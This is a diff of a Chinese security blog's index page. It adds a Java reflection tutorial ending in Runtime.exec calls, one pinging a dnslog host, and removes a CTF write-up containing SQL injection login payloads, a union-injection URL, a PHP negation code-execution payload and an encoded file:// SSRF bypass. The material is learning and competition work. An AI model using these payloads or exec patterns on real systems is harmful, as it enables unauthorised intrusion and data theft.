@@ -207,6 +207,300 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/58699674516d08.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/58699674516d08.html" class="post-title-link" itemprop="url">Java反射学习</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-11-15 20:08:31 / 修改时间：20:13:59" itemprop="dateCreated datePublished" datetime="2020-11-15T20:08:31+08:00">2020-11-15</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><a href="https://baike.baidu.com/item/JAVA反射机制/6015990" target="_blank" rel="noopener">JAVA反射机制</a>是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制</p>
+<h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><h3 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h3><pre><code class="java">package test;
+import java.lang.Class.*;
+
+public class reflection1 {
+    public static void main(String[] args) throws Exception {
+            Class.forName(&quot;test.xxx&quot;);
+    }
+}
+class xxx{
+    public void  xxx(){
+        System.out.println(&quot;hello world&quot;);
+    }
+    static {
+        System.out.println(&quot;test1&quot;);
+    }
+    {
+        System.out.println(&quot;test2&quot;);
+    }
+}</code></pre>
+<ul>
+<li>当<code>forName</code>方法获取一个类的时候会调用这个类的static静态代码。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-134345@2x.png" alt="WX20201115-134345@2x"></p>
+<h3 id="获取类方法"><a href="#获取类方法" class="headerlink" title="获取类方法"></a>获取类方法</h3><h4 id="获取全部方法"><a href="#获取全部方法" class="headerlink" title="获取全部方法"></a>获取全部方法</h4><ul>
+<li><code>getMethod</code>来获取函数的方法，执行<code>invoke</code>后通过<code>newInstance</code>来调用构造函数，但是<code>{}</code>的优先级会比构造方法高，所以运行结果会是先<code>{}</code>、构造方法、普通方法。</li>
+</ul>
+<pre><code class="java">package test;
+public class reflection1 {
+    public static void main(String[] args) throws Exception {
+        Class clazz=Class.forName(&quot;test.xxx&quot;);
+        //实例化类,然后调用方法
+        clazz.getMethod(&quot;hello&quot;).invoke(clazz.newInstance());
+    }
+}
+class xxx{
+    public   xxx(){
+        System.out.println(&quot;test1&quot;);
+    }
+    public void hello(){
+        System.out.println(&quot;hello&quot;);
+    }
+    static {
+        System.out.println(&quot;test2&quot;);
+    }
+    {
+        System.out.println(&quot;test3&quot;);
+    }
+}</code></pre>
+<ul>
+<li>运行结果</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-143559@2x.png" alt="WX20201115-143559@2x"></p>
+<h4 id="获取无参数构造方法"><a href="#获取无参数构造方法" class="headerlink" title="获取无参数构造方法"></a>获取无参数构造方法</h4><ul>
+<li>同样先需要获取到对应的类对象，然后通过<code>getDeclaredConstructor</code>方法来获取构造方法，这里有个细节如果获取的构造方法是私有（private）时候需要使用<code>setAccessible</code>,最后使用<code>newInstance</code>来创建实例。</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+
+public class reflection1 {
+    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
+        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();
+        constructor.setAccessible(true);
+        constructor.newInstance();
+    }
+}
+class zzz{
+    private zzz(){
+        System.out.println(&quot;this is zzz&quot;);
+    }
+    private zzz(String name){
+        System.out.println(&quot;this is &quot;+name);
+    }
+    private zzz(int age,String name){
+        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
+    }
+}</code></pre>
+<h4 id="获取含参数构造方法"><a href="#获取含参数构造方法" class="headerlink" title="获取含参数构造方法"></a>获取含参数构造方法</h4><ul>
+<li>同样使用<code>getDeclaredConstructor</code>方法来获取，但是需要指定参数数据类型。然后在<code>newInstance</code>传参即可。</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+
+public class reflection1 {
+    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
+        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
+        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(String.class);
+        constructor.setAccessible(true);
+        constructor.newInstance(&quot;黄莉荃&quot;);
+    }
+}
+class zzz{
+    private zzz(){
+        System.out.println(&quot;this is zzz&quot;);
+    }
+    private zzz(String name){
+        System.out.println(&quot;this is &quot;+name);
+    }
+    private zzz(int age,String name){
+        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
+    }
+}</code></pre>
+<h6 id="getDeclaredConstructors"><a href="#getDeclaredConstructors" class="headerlink" title="getDeclaredConstructors"></a>getDeclaredConstructors</h6><ul>
+<li><code>getDeclaredConstructors</code>将会返回所有构造方法的数组</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-153623@2x.png" alt="WX20201115-153623@2x"></p>
+<ul>
+<li>以获取索引为2的方法为例：</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+
+public class reflection1 {
+    public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
+        Class&lt;?&gt; clazz = Class.forName(&quot;test.zzz&quot;);
+        Constructor&lt;?&gt;[] constructors = clazz.getDeclaredConstructors();
+        Constructor constructor = constructors[2];
+        constructor.setAccessible(true);
+//      输出内容
+        System.out.println(constructor);
+        constructor.newInstance(18,&quot;黄莉荃&quot;);
+    }
+}
+class zzz{
+    private zzz(){
+        System.out.println(&quot;this is zzz&quot;);
+    }
+    private zzz(String name){
+        System.out.println(&quot;this is &quot;+name);
+    }
+    private zzz(int age,String name){
+        System.out.println(&quot;this is &quot;+age+&quot;:&quot;+name);
+    }
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-154252@2x.png" alt="WX20201115-154252@2x"></p>
+<h4 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h4><ul>
+<li>通过<code>getDeclaredField</code>来获取字段，如果是私有字段只需加上<code>field.setAccessible(true);</code>即可</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        //获取类
+        Class clazz=Class.forName(&quot;test.test&quot;);
+        //获取私有方法
+        Constructor c = clazz.getDeclaredConstructor();
+        //获取私有字段
+        Field field = clazz.getDeclaredField(&quot;age&quot;);
+        System.out.println(field.get(c.newInstance()));
+    }
+}
+
+class test{
+    public test(){
+        System.out.println(&quot;test&quot;);
+    }
+    public int age=222;
+}</code></pre>
+<h4 id="修改字段值"><a href="#修改字段值" class="headerlink" title="修改字段值"></a>修改字段值</h4><ul>
+<li>使用set方法即可修改</li>
+</ul>
+<pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        //获取类
+        Class clazz=Class.forName(&quot;test.test&quot;);
+        //获取私有方法
+        Constructor c = clazz.getDeclaredConstructor();
+        //获取私有字段
+        Object o = c.newInstance();
+        Field field = clazz.getDeclaredField(&quot;age&quot;);
+        field.set(o,1111);
+        System.out.println(field.get(o));
+    }
+}
+
+class test{
+    public test(){
+        System.out.println(&quot;test&quot;);
+    }
+    public int age=222;
+}</code></pre>
+<h4 id="反射调用java-lang-Runtime"><a href="#反射调用java-lang-Runtime" class="headerlink" title="反射调用java.lang.Runtime"></a>反射调用<code>java.lang.Runtime</code></h4><h5 id="利用方法一"><a href="#利用方法一" class="headerlink" title="利用方法一"></a>利用方法一</h5><pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor c = clazz.getDeclaredConstructor();
+        c.setAccessible(true);
+        clazz.getMethod(&quot;exec&quot;, String.class).invoke(c.newInstance(),&quot;open /Users/gqleung/Desktop/aaaa.txt&quot;);
+    }
+}</code></pre>
+<ul>
+<li>成功打开桌面的<code>aaaa.txt</code></li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-160241@2x.png" alt="WX20201115-160241@2x"></p>
+<h5 id="利用方法二"><a href="#利用方法二" class="headerlink" title="利用方法二"></a>利用方法二</h5><pre><code class="java">package test;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class reflection1 {
+    public static &lt;Feild&gt; void main(String[] args) throws Exception {
+        Class clazz=Class.forName(&quot;java.lang.Runtime&quot;);
+        clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;ping y3qge8.dnslog.cn&quot;);
+    }
+}</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201115-161159@2x.png" alt="WX20201115-161159@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/1d5b525ad1bdf.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2242,256 +2536,6 @@ for i in range(50):
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d69999e3fb.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d69999e3fb.html" class="post-title-link" itemprop="url">2020″第五空间”智能安全大赛线上初赛Writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-06-28 22:42:41" itemprop="dateCreated datePublished" datetime="2020-06-28T22:42:41+08:00">2020-06-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:24:22" itemprop="dateModified" datetime="2020-10-14T17:24:22+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.4k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="美团外卖"><a href="#美团外卖" class="headerlink" title="美团外卖"></a>美团外卖</h3><p>这道题是我上次日的裸聊木马后台…..</p>
-<h4 id="登陆注入"><a href="#登陆注入" class="headerlink" title="登陆注入"></a>登陆注入</h4><ul>
-<li>从<code>login.php</code>,登陆是调用了<code>\common\Function.php</code>,的<code>login()</code>函数。直接定位到该函数(如下)，可以看到他对调用了<code>GetValue()</code>可以简单了解传入了用户名和表名获取了密码再和传入的密码的md5加密后的值进行比较。</li>
-</ul>
-<pre><code class="php">function Login(){
-    $x1=1;//用户名长度限制
-    $x2=1;//用户密码长度限制
-    if(strlen(P(&#39;username&#39;))&gt;0 and strlen(P(&#39;password&#39;))&gt;0){
-if(1&lt;0){
-    Nts(&#39;请输入信息登录&#39;);
-}
-else{
-
-    if(GetValue(&#39;admin.upass&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;)==md5(P(&#39;password&#39;))){
-    $_SESSION[&#39;adminuser&#39;]=array();
-    $_SESSION[&#39;adminuser&#39;][&#39;uname&#39;] = GetValue(&#39;admin.uname&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;);
-    $_SESSION[&#39;adminuser&#39;][&#39;id&#39;] = GetValue(&#39;admin.id&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;);
-    $_SESSION[&#39;adminuser&#39;][&#39;qudao&#39;] = GetValue(&#39;admin.qudao&#39;,&quot;uname=&#39;&quot;.P(&#39;username&#39;).&quot;&#39; and id&gt;0&quot;);
-        Tz(&#39;index&#39;);
-    }
-    else{
-        Nts(&#39;登录失败！&#39;);
-    }
-
-}    
-    }
-
-}</code></pre>
-<ul>
-<li>我们再来看<code>GetValue()</code>的原函数，在同一文件下的243行，可以明显看到没有对传入参数进行过滤，而且对传入的第一个参数进行了分割，我们在登陆验证时候传入的第一参数是<code>admin.upass</code>，也就是分割成，admin和upass,第二个参数是<code>&quot;uname=&#39;&quot;.P(&#39;username&#39;)</code>可以还原为：<code>select upass  from admin  where uname=&#39;$_POST[&#39;username]&#39;</code>，这里我们直接传入一个不存在的用户名使用联合注入指定返回的密码即可</li>
-</ul>
-<pre><code class="php">function GetValue($str,$where){
-    $str = explode(&#39;.&#39;,$str);
-    $a = mysqli_query($GLOBALS[&#39;link&#39;],&quot;select &quot;.$str[1].&quot; from &quot;.$str[0].&quot; where $where&quot;);
-    $row = mysqli_fetch_array($a);
-    if($row){
-        return $row[$str[1]];
-    }
-    else{
-        return false;
-        }
-}</code></pre>
-<ul>
-<li>登陆注入payload如下：</li>
-</ul>
-<pre><code>账号:1&#39;union select &#39;21232f297a57a5a743894a0e4a801fc3&#39;--+
-密码：admin</code></pre><h4 id="导出列表显注"><a href="#导出列表显注" class="headerlink" title="导出列表显注"></a>导出列表显注</h4><ul>
-<li>在daochu.php存在明显的注入。关键代码如下，直接使用联合注入即可：</li>
-</ul>
-<pre><code class="php">if($type==1){
-    $biao=&#39;content&#39;;
-    $result = mysqli_query($link,&#39;select * from &#39;.$biao.&#39; where imei=&quot;&#39;.$imei.&#39;&quot; and  imei2=&quot;&#39;.$imei2.&#39;&quot;&#39;);
-
-    echo &#39;select * from &#39;.$biao.&#39; where imei=&quot;&#39;.$imei.&#39;&quot; and  imei2=&quot;&#39;.$imei2.&#39;&quot;&#39;；
-
-
-echo &#39;&lt;table border=&quot;1&quot;&gt;&#39;;
-echo &#39;&lt;tr&gt;&lt;th&gt;user&lt;/th&gt;&lt;th&gt;code&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;phonenumber&lt;/th&gt;&lt;/tr&gt;&#39;;
-while ($row = mysqli_fetch_assoc($result)){
-    echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&#39;imei&#39;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#39;imei2&#39;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#39;name&#39;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&#39;tel&#39;].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;
-}
-echo &#39;&lt;/table&gt;&#39;;
-}</code></pre>
-<ul>
-<li>payload:</li>
-</ul>
-<pre><code class="http">daochu.php?imei=a&amp;type=1&amp;imei=-1&amp;imei2=-1%22union+select+1,2,3,(select+hints+from+hint),5,6--+</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200624224236.png" alt="微信截图_20200624224236"></p>
-<h4 id="文件上传发现后门"><a href="#文件上传发现后门" class="headerlink" title="文件上传发现后门"></a>文件上传发现后门</h4><ul>
-<li>提示看<code>956c110ef9decdd920249f5fed9e4427</code>看这个文件夹。打开还是这个系统，不过这次这个系统文件是齐全的。我们在代码审计时候就发现<code>\lib\webuploader\0.1.5\serverpreview.php</code>能够上传文件。于是构造构造一个base64上传一个文件看看,提示<code>!!!! Congratulations on infiltrating here, but it&#39;s a pity that someone has infiltrated and left a Trojan, do not continue here , please see the e98a4571cf72b798077d12d6c94629.php !!!!!</code> OK最后直接getflag即可。。。。</li>
-</ul>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200624224641.png" alt="微信截图_20200624224641"></p>
-<ul>
-<li>最终EXP</li>
-</ul>
-<pre><code class="http">http://119.3.183.154/956c110ef9decdd920249f5fed9e4427/lib/webuploader/0.1.5/server/e98a4571cf72b798077d12d6c94629.php?file=/flag</code></pre>
-<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200624224840.png" alt="微信截图_20200624224840"></p>
-<h3 id="hate-php"><a href="#hate-php" class="headerlink" title="hate-php"></a><strong>hate-php</strong></h3><ul>
-<li>老套路取反,没啥难度</li>
-<li>EXP</li>
-</ul>
-<pre><code class="php">http://121.36.74.163/?code=${~%a0%b8%ba%ab}{%a0}(${~%a0%b8%ba%ab}{%a1})&amp;%a0=highlight_file&amp;%a1=flag.php</code></pre>
-<h3 id="do-you-know"><a href="#do-you-know" class="headerlink" title="do you know"></a>do you know</h3><ul>
-<li>上来直接来代码,代码是从xctf-final里面一道题扣出来的。总共有五个文件，index.php、xxe.php、hints.php、main.php、flag.php，从代码来看，第一步ssrf没有直接传参的，所以目测使用gopher://进行post打xxe.但是我一直没有构造成功。</li>
-</ul>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-#本题无法访问外网
-#这题真没有其他文件，请不要再开目录扫描器了，有的文件我都在注释里面告诉你们了
-#各位大佬...这题都没有数据库的存在...麻烦不要用工具扫我了好不好
-#there is xxe.php
-$poc=$_SERVER[&#39;QUERY_STRING&#39;];
-if(preg_match(&quot;/log|flag|hist|dict|etc|file|write/i&quot; ,$poc)){
-                die(&quot;no hacker&quot;);
-        }
-$ids=explode(&#39;&amp;&#39;,$poc);
-$a_key=explode(&#39;=&#39;,$ids[0])[0];
-$b_key=explode(&#39;=&#39;,$ids[1])[0];
-$a_value=explode(&#39;=&#39;,$ids[0])[1];
-$b_value=explode(&#39;=&#39;,$ids[1])[1];
-
-if(!$a_key||!$b_key||!$a_value||!$b_value)
-{
-        die(&#39;我什么都没有~&#39;);
-}
-if($a_key==$b_key)
-{
-    die(&quot;trick&quot;);
-}
-
-if($a_value!==$b_value)
-{
-        if(count($_GET)!=1)
-        {
-                die(&#39;be it so&#39;);
-        }
-}
-foreach($_GET as $key=&gt;$value)
-{
-        $url=$value;
-}
-
-$ch = curl_init();
-    if ($type != &#39;file&#39;) {
-        #add_debug_log($param, &#39;post_data&#39;);
-        // 设置超时
-        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-    } else {
-        // 设置超时
-        curl_setopt($ch, CURLOPT_TIMEOUT, 180);
-    }
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-
-    // 设置header
-    if ($type == &#39;file&#39;) {
-        $header[] = &quot;content-type: multipart/form-data; charset=UTF-8&quot;;
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-    } elseif ($type == &#39;xml&#39;) {
-        curl_setopt($ch, CURLOPT_HEADER, false);
-    } elseif ($has_json) {
-        $header[] = &quot;content-type: application/json; charset=UTF-8&quot;;
-        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
-    }
-
-    // curl_setopt($ch, CURLOPT_USERAGENT, &#39;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)&#39;);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-    curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
-    // dump($param);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
-    // 要求结果为字符串且输出到屏幕上
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    // 使用证书：cert 与 key 分别属于两个.pem文件
-
-
-    $res = curl_exec($ch);
-    var_dump($res);</code></pre>
-<ul>
-<li>这里出题人使用$_SERVER[‘QUERY_STRING’]对参数进行过滤，众所周知$_SERVER[‘QUERY_STRING’]是不会进行urldecode的。所以这里直接urlencode直接可以绕过这个过滤，getflag.</li>
-</ul>
-<pre><code>http://121.36.64.91/?a=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70&amp;b=%66%69%6c%65%3a%2f%2f%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%66%6c%61%67%2e%70%68%70</code></pre>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2563,7 +2607,7 @@ $ch = curl_init();
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-count">76</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2634,7 +2678,7 @@ $ch = curl_init();
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">282k</span>
+    <span title="站点总字数">283k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
